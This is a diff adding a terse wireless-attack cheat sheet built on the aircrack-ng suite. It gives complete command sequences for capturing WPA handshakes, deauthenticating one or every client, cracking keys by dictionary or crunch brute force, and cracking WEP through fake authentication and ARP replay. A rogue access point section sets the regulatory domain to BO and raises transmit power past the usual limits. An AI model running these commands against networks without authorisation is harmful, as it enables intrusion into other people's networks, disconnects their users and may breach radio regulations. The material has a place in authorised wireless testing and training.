@@ -1,0 +1,66 @@
+﻿WPA PSK attack with aircrack-ng suite.
+--------------------------------------
+
+Place your wireless card into Monitor Mode
+airmon-ng start wlan0
+
+Detect all available wireless AP’s and clients
+airodump-ng mon0
+
+Setting adapter channel
+iwconfig mon0 channel <channel_number>
+
+Capturing the four-way handshake
+airodump-ng --channel <channel_number> --bssid <bssid> --write capture mon0
+
+You can capture the handshake passively (it takes time) or de-authenticate a client.
+
+De-authentication attack
+aireplay-ng --deauth 3 -a <BSSID> -c <client_mac> mon0
+
+Deauth every client - aireplay-ng -0 5 -a <bssid> mon0
+
+Dictionary Attack
+aircrack-ng -w passwords.lst capture-01.cap
+
+Brute force Attack
+crunch 8 8 0123456789 | aircrack-ng -e "Name of Wireless Network" -w - /root/home/wpa2.eapol.cap
+
+
+WEP attack with aircrack-ng suite.
+----------------------------------
+
+Place your wireless card into Monitor Mode
+airmon-ng start wlan0
+
+Detect all available wireless AP’s and clients
+airodump-ng mon0
+
+Setting adapter channel
+iwconfig mon0 channel <channel_number>
+
+airodump-ng -c (channel) -w (file name) --bssid (bssid) (interface)
+
+aireplay-ng -1 0 -a (bssid) -h 00:11:22:33:44:55 -e (essid) (interface)
+
+aireplay-ng -3 -b (bssid) -h 00:11:22:33:44:55 (interface)
+
+aircrack-ng -b (bssid) (file name-01.cap)
+
+
+Rogue Access Point Testing
+--------------------------
+
+# ifconfig wlan0 down
+# iw reg set BO
+# iwconfig wlan0 txpower 0
+# ifconfig wlan0 up
+# airmon-ng start wlan0
+# airodump-ng --write capture mon0
+
+root@backbox:/home/backbox# ifconfig wlan1 down
+root@backbox:/home/backbox# iw reg set BO
+root@backbox:/home/backbox# ifconfig wlan1 up
+root@backbox:/home/backbox# iwconfig wlan1 channel 13
+root@backbox:/home/backbox# iwconfig wlan1 txpower 30
+root@backbox:/home/backbox# iwconfig wlan1 rate 11M auto
